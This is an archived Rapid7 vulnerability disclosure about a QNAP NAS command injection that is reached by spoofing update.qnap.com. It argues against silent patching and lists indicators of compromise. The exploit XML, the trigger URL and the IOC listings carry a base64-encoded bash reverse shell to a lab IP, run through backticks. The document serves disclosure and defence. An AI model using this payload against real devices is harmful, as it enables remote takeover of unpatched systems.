---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-08-04_qnap-poisoned-xml-command-injection-silently-patched.md
original_filename: 2022-08-04_qnap-poisoned-xml-command-injection-silently-patched.md
title: QNAP Poisoned XML Command Injection (Silently Patched)
category: documents
detected_topics:
- command-injection
- sso
- idor
- automation-abuse
- api-security
- supply-chain
tags:
- imported
- documents
- command-injection
- sso
- idor
- automation-abuse
- api-security
- supply-chain
language: en
raw_sha256: 1b7c554917399435c050b0b1f0a06d0ac9055bfb6d1b7e79cff3a7831ec97021
text_sha256: f2a13f1ce95870425ace9036c576325d5334a3ac765b983d36f7cd126d95ec95
ingested_at: '2026-06-28T07:32:13Z'
sensitivity: unknown
redactions_applied: false
---

# QNAP Poisoned XML Command Injection (Silently Patched)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-08-04_qnap-poisoned-xml-command-injection-silently-patched.md
- Source Type: markdown
- Detected Topics: command-injection, sso, idor, automation-abuse, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:13Z
- Redactions Applied: False
- Raw SHA256: `1b7c554917399435c050b0b1f0a06d0ac9055bfb6d1b7e79cff3a7831ec97021`
- Text SHA256: `f2a13f1ce95870425ace9036c576325d5334a3ac765b983d36f7cd126d95ec95`


## Content

---
title: "QNAP Poisoned XML Command Injection (Silently Patched)"
page_title: "QNAP Poisoned XML Command Injection (Silently Patched) | Rapid7 Blog"
url: "https://www.rapid7.com/blog/post/2022/08/04/qnap-poisoned-xml-command-injection-silently-patched/"
final_url: "https://www.rapid7.com/blog/post/2022/08/04/qnap-poisoned-xml-command-injection-silently-patched/"
authors: ["Jake Baines (@Junior_Baines)"]
programs: ["QNAP"]
bugs: ["OS command injection", "RCE"]
publication_date: "2022-08-04"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2365
---

## Background

CVE-2020-2509 was added to CISA’s [Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) in April 2022, and it was listed as one of the “Additional Routinely Exploited Vulnerabilities in 2021” in CISA’s [2021 Top Routinely Exploited Vulnerabilities](https://www.cisa.gov/uscert/ncas/alerts/aa22-117a) alert. However, CVE-2020-2509 has no public exploit, and no other organizations have publicly confirmed exploitation in the wild.

![image9.png](https://www.rapid7.com/cdn/images/bltac5d81d7360a9dd3/683ddd6018a5535b46686f09/image9.png)

CVE-2020-2509 is allegedly an unauthenticated remote command injection vulnerability affecting QNAP Network Attached Storage (NAS) devices using the QTS operating system. The vulnerability was discovered by [SAM](https://securingsam.com/new-vulnerabilities-allow-complete-takeover/) and publicly disclosed on March 31, 2021. Two weeks later, QNAP issued a CVE and an [advisory](https://www.qnap.com/en/security-advisory/qsa-21-05).

Neither organization provided a CVSS vector to describe the vulnerability. QNAP’s advisory doesn’t even indicate the vulnerable component. SAM’s disclosure says they found the vulnerability when they “fuzzed” the web server’s CGI scripts (which is not generally the way you discover command injection vulnerabilities, but I digress). SAM published a [proof-of-concept video](https://web.archive.org/web/20210402153643im_/https://securingsam.com/wp-content/uploads/2021/03/render1617112752460_optimized.gif) that allegedly demonstrates exploitation of the vulnerability, although it doesn’t appear to be a typical straightforward command injection. The recorded exploit downloads BusyBox to establish a reverse shell, and it appears to make multiple requests to accomplish this. That’s many more moving parts than a typical command injection exploit. Regardless, beyond affected versions, there are essentially no usable details for defender or attackers in either disclosure.

Given the ridiculous amount of internet-facing QNAP NAS ([350,000+](https://www.shodan.io/search?query=product%3A%22QNAP%22)), seemingly endless ransomware attacks on the systems ([Qlocker](https://www.qnap.com/static/landing/2021/qlocker/response/da-dk/), [Deadbolt](https://www.qnap.com/en/security-advisory/QSA-22-19), and [Checkmate](https://www.qnap.com/en-us/security-advisory/QSA-22-21)), and the mystery surrounding alleged exploitation in the wild of CVE-2020-2509, we decided to find out exactly what CVE-2020-2509 is. Instead, we found the below, which may be an entirely new vulnerability.

## Poisoned XML command injection (CVE-2022-XXXX)

![Vidyard video](https://play.vidyard.com/z3bvrNdnVoB3mgjvkzEMDC.jpg)

![](https://play.vidyard.com/z3bvrNdnVoB3mgjvkzEMDC.jpg)

The video demonstrates [exploitation](https://github.com/jbaines-r7/overkill) of an unauthenticated and remote command injection vulnerability on a QNAP TS-230 running QTS 4.5.1.1480 (reportedly the last version affected by CVE-2020-2509). We were unable to obtain the first patched version, QTS 4.5.1.1495, but we were able to confirm this vulnerability was patched in QTS 4.5.1.1540. However, we don’t think this is CVE-2020-2509. The exploit in the video requires the attacker be a [man-in-the-middle](/fundamentals/man-in-the-middle-attacks/) or have performed a [DNS hijack](https://threatmodel.venafi.com/techniques/VT0022/002/) of update.qnap.com. In the video, our lab network’s Mikrotik router has a malicious static DNS entry for update.qnap.com.

![image6.png](https://www.rapid7.com/cdn/images/blt12d5a2f7a51d3a7c/683ddd87bc38b17b81477bf5/image6.png)

SAM and QNAP’s disclosures didn’t mention any type of man-in-the-middle or DNS hijacks. But neither disclosure ruled it out either. CVSS vectors are great for this sort of thing. If either organization had published a vector with an Attack Complexity of high, we’d know this “new” vulnerability is CVE-2020-2509. If they’d published a vector with Attack Complexity of low, we’d know this “new” vulnerability is not CVE-2020-2509. The lack of a vector leaves us unsure. Only CISA’s claim of widespread exploitation leads us to believe this is not is CVE-2020-2509. However, this “new” vulnerability is still a high-severity issue. It could reasonably be scored as CVSSv3 8.1 ([AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H&version=3.1)). While the issue was patched 15 to 20 months ago (patches for CVE-2021-2509 were released in November 2020 and April 2021), there are still thousands of internet-facing QNAP devices that remain unpatched against this “new” issue. As such, we are going to describe the issue in more detail.

## Exploitation and patch

The “new” vulnerability can be broken down into two parts:

A remote and unauthenticated attacker can force a QNAP device to make an HTTP request to update.qnap.com, without using SSL, in order to download an XML file. Content from the downloaded XML file is passed to a system call without any sanitization.

Both of these issues can be found in the QNAP’s web server cgi-bin executable authLogin.cgi, but the behavior is triggered by a request to /cgi-bin/qnapmsg.cgi. Below is decompiled code from authLogin.cgi that highlights the use of HTTP to fetch a file.

![image8.png](https://www.rapid7.com/cdn/images/blt94b7048b98048988/683dddaa4c5a098eaa5e09e7/image8.png)

Using wget, the QNAP device will download a language-specific XML file such as http://update.qnap.com/loginad/qnapmsg_eng.xml, where eng can be a variety of different values (cze, dan, ger, spa, fre, ita, etc.). When the XML has been downloaded, the device then parses the XML file. When the parser encounters <img> tags, it will attempt to download the associated image using wget.

![image4-1.png](https://www.rapid7.com/cdn/images/blt2c14cd36e7d3570f/683dddd13a1c5a30004ba7a9/image4-1.png)

The <img> value is added to a wget command without any type of sanitization, which is a very obvious command injection issue.

![image3-1.png](https://www.rapid7.com/cdn/images/blt2b9254f733ed5422/683dddfb30073ed757eb1764/image3-1.png)

The XML, if downloaded straight from QNAP, looks like the following (note that it appears to be part of an advertisement system built into the device):
  
  
  <?xml version="1.0" encoding="utf-8"?>
  <Root>
  <Messages>
  <Message>
  <img>http://update.qnap.com/loginad/image/1_eng.jpg</img>
  <link>http://www.qnap.com/en/index.php?lang=en&amp;sn=822&amp;c=351&amp;sc=513&amp;t=520&amp;n=18168</link>
  </Message>
  <Message>
  <img>http://update.qnap.com/loginad/image/4_eng.jpg</img>
  <link>http://www.qnap.com/en/index.php?lang=en&amp;sn=8685</link>
  </Message>
  <Message>
  <img>http://update.qnap.com/loginad/image/2_eng.jpg</img>
  <link>http://www.facebook.com/QNAPSys</link>
  </Message>
  </Messages>
  </Root>
  

Because of the command injection issue, a malicious attacker can get a reverse shell by providing an XML file that looks like the following. The command injection is performed with backticks, and the actual payload (a bash reverse shell using /dev/tcp) is base64 encoded because / is a disallowed character.
  
  
  ​​<?xml version="1.0" encoding="utf-8"?>
  <Root>
  <Messages>
  <Message>
  <img>/`echo -ne 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMi43MC4yNTIvMTI3MCAwPiYx' | base64 -d | sh`</img>
  <link>http://www.qnap.com/></link>
  </Message>
  </Messages>
  </Root>
  

An attacker can force a QNAP device to download the XML file by sending the device an HTTP request similar to http://device_ip/cgi-bin/qnapmsg.cgi?lang=eng. Here, again, eng can be replaced by a variety of languages.

Obviously, the number one challenge to exploit this issue is getting the HTTP requests for update.qnap.com routed to an attacker-controlled system.

![image5.png](https://www.rapid7.com/cdn/images/bltcc60ba02aee57408/683dde2030073effa8eb1778/image5.png)

Becoming a man-in-the-middle is not easy for a normal attacker. However, APT groups have consistently demonstrated that man-in-the-middle attacks are a part of normal operations. [VPNFilter](https://blog.talosintelligence.com/2018/06/vpnfilter-update.html), [FLYING PIG](https://www.motherjones.com/politics/2013/09/flying-pig-nsa-impersonates-google/), and the [Iranian Digator incident](https://www.cnet.com/news/privacy/fraudulent-google-certificate-points-to-internet-attack/) are all historical examples of APT attacking (or potentially attacking) via man-in-the-middle. An actor that has control of any router between the QNAP and update.qnap.com can inject the malicious XML we provided above. This, in turn, allows them to execute arbitrary code on the QNAP device.

![image1-2.png](https://www.rapid7.com/cdn/images/blt85465743e9ac57b6/683dde4e8ac17c0c1929acfe/image1-2.png)

The other major attack vector is via DNS hijacking. For this vulnerability, the most likely DNS hijack attacks that don’t require man-in-the-middling are router DNS hijack or third-party DNS server compromise. In the case of a router DNS hijack, the attacker exploits a router and instructs it to tell all connected devices to use a malicious DNS server or malicious static routes (similar to our lab setup). [Third-party DNS server compromise](https://attack.mitre.org/techniques/T1584/002/) is more interesting because of its ability to scale. Both [Mandiant](https://www.mandiant.com/resources/global-dns-hijacking-campaign-dns-record-manipulation-at-scale) and [Talos](https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targets-middle-east.html) have observed this type of DNS hijack in the wild. When a third-party DNS server is compromised, an attacker is able to introduce malicious entries to the DNS server.

![image7.png](https://www.rapid7.com/cdn/images/blt08dbe966ccb20b1f/683dde804b2b7f0d40e160a1/image7.png)

So, while there is some complexity to exploiting this issue, those complications are easily defeated by a moderately skilled attacker — which calls into question why QNAP didn’t issue an advisory and CVE for this issue. Presumably they knew about the vulnerability, because they made two changes to fix it. First, the insecure HTTP request for the XML was changed to a secure HTTPS request. That prevents all but the most advanced attackers from masquerading as update.qnap.com. Additionally, the image download logic was updated to use an execl wrapper called qnap_exec instead of system, which mitigates command injection issues.

![image2-1.png](https://www.rapid7.com/cdn/images/blt2a0186f497a7fe69/683ddebaabf2ad219f3c4313/image2-1.png)

## Indicators of compromise

This attack does leave indicators of compromise (IOCs) on disk. A smart attacker will clean up these IOCs, but they may be worth checking for. The downloaded XML files are downloaded to /home/httpd/RSS/rssdoc/. The following is an example of the malicious XML from our proof-of-concept video:
  
  
  [albinolobster@NAS4A32F3 rssdoc]$ ls -l
  total 32
  -rw-r--r-- 1 admin administrators  0 2022-07-27 19:57 gen_qnapmsg_eng.xml
  drwxrwxrwx 2 admin administrators  4096 2022-07-26 18:39 image/
  -rw-r--r-- 1 admin administrators  8 2022-07-27 19:57 last_uptime.qnapmsg_eng.xml
  -rw-r--r-- 1 admin administrators  229 2022-07-27 19:57 qnapmsg_eng.xml
  -rw-r--r-- 1 admin administrators 18651 2022-07-27 16:02 wget.log
  [albinolobster@NAS4A32F3 rssdoc]$ cat qnapmsg_eng.xml 
  <?xml version="1.0" encoding="utf-8"?>
  <Root>
  <Messages>
  <Message><img>/`(echo -ne 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMi43MC4yNTIvMTI3MCAwPiYx' | base64 -d | sh)&`</img><link>http://www.qnap.com/</link></Message></Messages></Root>
  

Similarly, an attack can leave an sh process hanging in the background. Search for malicious ones using ps | grep wget. If you see anything like the following, it’s a clear IOC:
  
  
  [albinolobster@NAS4A32F3 rssdoc]$ ps | grep wget
  10109 albinolo  476 S  grep wget
  12555 admin  2492 S  sh -c /usr/bin/wget -t 1 -T 5 /`(echo -ne
  'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMi43MC4yNTIvMTI3MCAwPiYx' | base64 -d |
  sh)` -O /home/httpd/RSS/rssdoc/image/`(echo -ne
  'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMi43MC4yNTIvMTI3MCAwPiYx' | base64 -d |
  sh)`.tmp 1>>/dev/null 2>>/dev/null
  

## Conclusion

Perhaps what we’ve described here is in part CVE-2020-2509, and that explains the lack of advisory from QNAP. Or maybe it’s one of the [many other command injections](https://www.cvedetails.com/vulnerability-list/vendor_id-10080/Qnap.html) that QNAP has assigned a CVE but failed to describe, and therefore denied users the chance to make informed choices about their security. It’s impossible to know because QNAP publishes almost no details about any of their vulnerabilities — a practice that _might_ thwart some attackers, but [certainly harms defenders](/blog/post/2022/06/06/the-hidden-harm-of-silent-patches/) trying to identify and monitor these attacks in the wild, as well as defenders who have to help clean up the myriad ransomware cases that are affecting QNAP devices.

SAM did not owe us a good disclosure (which is fortunate, because they didn’t give us one), but QNAP _did_. SAM was successful in ensuring the issue got fixed, and they held the vendor to a coordinated disclosure deadline (which QNAP consequently failed to meet). We should all be grateful to SAM: Even if their disclosure wasn’t necessarily what we wanted, we all benefited from their work. It’s QNAP that owes us, the customers and security industry, good disclosures. Vendors who are responsible for the security of their products are also responsible for informing the community of the seriousness of vulnerabilities that affect those products. When they fail to do this — for example by failing to provide advisories with basic descriptions, affected components, and industry-standard metrics like CVSS — they deny their current and future users full autonomy over the choices they make about risk to their networks. This makes us all less secure.

## Disclosure timeline

  * **July, 2022:** Researched and discovered by Jake Baines of Rapid7
  * **Thu, Jul 28, 2022:** Disclosed to QNAP, seeking a CVE ID
  * **Sun, Jul 31, 2022:** Automated response from vendor indicating they have moved to a new support ticket system and ticket should be filed with that system. Link to new ticketing system merely sends Rapid7 to QNAP’s [home page](https://service.qnap.com/en-us).
  * **Tue, Aug 2, 2022:** Rapid7 informs QNAP via email that their support link is broken and Rapid7 will publish this blog on August 4, 2022.
  * **Tue, Aug 2, 2022:** QNAP responds directing Rapid7 to the [advisory](https://www.qnap.com/en/security-advisory/qsa-21-05) for CVE-2020-2509.
  * **Thu, Aug 4, 2022:** This public disclosure

#### NEVER MISS A BLOG

Get the latest stories, expertise, and news about security today.

Subscribe

  

 _**Additional reading:**_

  * [_The Hidden Harm of Silent Patches_](/blog/post/2022/06/06/the-hidden-harm-of-silent-patches/)
  * [ _Primary Arms PII Disclosure via IDOR (FIXED)_](/blog/post/2022/08/02/primary-arms-pii-disclosure-via-idor/)
  * [_CVE-2021-3779: Ruby-MySQL Gem Client File Read (FIXED)_](/blog/post/2022/06/28/cve-2021-3779-ruby-mysql-gem-client-file-read-fixed/)
  * [_CVE-2022-31749: WatchGuard Authenticated Arbitrary File Read/Write (Fixed)_](/blog/post/2022/06/23/cve-2022-31749-watchguard-authenticated-arbitrary-file-read-write-fixed/)  

[![LinkedIn](/linkedin-logo.svg)](https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.rapid7.com%2Fblog%2Fpost%2F2022%2F08%2F04%2Fqnap-poisoned-xml-command-injection-silently-patched&title=QNAP%20Poisoned%20XML%20Command%20Injection%20\(Silently%20Patched\))[![Facebook](/facebook-logo.svg)](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.rapid7.com%2Fblog%2Fpost%2F2022%2F08%2F04%2Fqnap-poisoned-xml-command-injection-silently-patched)[![X](/x-logo.svg)](https://twitter.com/intent/tweet?url=https%3A%2F%2Fwww.rapid7.com%2Fblog%2Fpost%2F2022%2F08%2F04%2Fqnap-poisoned-xml-command-injection-silently-patched&text=QNAP%20Poisoned%20XML%20Command%20Injection%20\(Silently%20Patched\))[![Bluesky](/bluesky-dark-logo.svg)](https://bsky.app/intent/compose?text=QNAP%20Poisoned%20XML%20Command%20Injection%20\(Silently%20Patched\)%20https%3A%2F%2Fwww.rapid7.com%2Fblog%2Fpost%2F2022%2F08%2F04%2Fqnap-poisoned-xml-command-injection-silently-patched)

#### Article Tags

  * [Vulnerability Disclosure](/blog/tag/vulnerability-disclosure/)
  * [Research](/blog/tag/research/)
  * [Risk Management](/blog/tag/cybersecurity-risk-management/)

[![Jake Baines](/default-author-image.svg)Jake BainesAuthor Posts](/blog/author/jake-baines/)
